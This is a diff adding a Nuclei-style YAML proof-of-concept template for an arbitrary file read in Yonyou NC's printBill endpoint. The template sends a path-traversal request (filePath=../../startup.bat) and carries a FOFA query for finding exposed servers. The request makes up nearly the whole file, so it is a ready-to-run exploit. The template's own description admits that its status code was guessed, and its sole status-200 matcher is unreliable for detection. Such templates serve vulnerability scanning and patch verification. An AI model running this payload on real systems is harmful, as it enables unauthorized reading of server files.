@@ -1,0 +1,29 @@
+id: poc-xq3ioka977rcatok
+info:
+  name: 用友NC printBill任意文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xq3ioka977rcatok
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xq3ioka977rcatok
+    fofa: body="Client/Uclient/UClient.dmg"
+http:
+- raw:
+  - 'GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 68'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
